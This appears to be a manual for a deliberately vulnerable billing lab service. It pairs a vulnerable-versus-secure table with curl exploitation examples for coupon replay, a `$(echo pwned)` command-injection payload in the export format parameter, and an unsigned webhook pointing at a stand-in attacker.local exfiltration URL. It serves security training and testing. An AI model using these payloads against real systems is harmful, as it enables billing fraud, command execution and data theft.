# Billing Service Manual

## Endpoints
- `POST /billing/coupon/apply`
- `GET /billing/export?format=...`
- `POST /billing/webhook`

## Vulnerable vs Secure Behavior

| Area | Vulnerable Mode | Secure Mode |
|---|---|---|
| Coupon replay | Coupon can be reused repeatedly | Replay blocked after first use |
| Export handler | Executes shell command with untrusted format | Accepts only `json` or `csv` |
| Webhook validation | Accepts unsigned payload | Requires `signature` field |
| Webhook exfil channel | Forwards attacker URL in payload | Validation gate blocks unsigned abuse |

## Exploitation Examples

### Coupon reuse abuse
```bash
curl -s -X POST http://localhost:18080/billing/coupon/apply \
  -H 'content-type: application/json' \
  -d '{"code":"SPRINT","amount":100}'
curl -s -X POST http://localhost:18080/billing/coupon/apply \
  -H 'content-type: application/json' \
  -d '{"code":"SPRINT","amount":100}'
```

### Export command injection surface
```bash
curl -s "http://localhost:18080/billing/export?format=json%24%28echo%20pwned%29"
```

### Unsigned webhook exfiltration
```bash
curl -s -X POST http://localhost:18080/billing/webhook \
  -H 'content-type: application/json' \
  -d '{"url":"https://attacker.local/collect?dump=true"}'
```
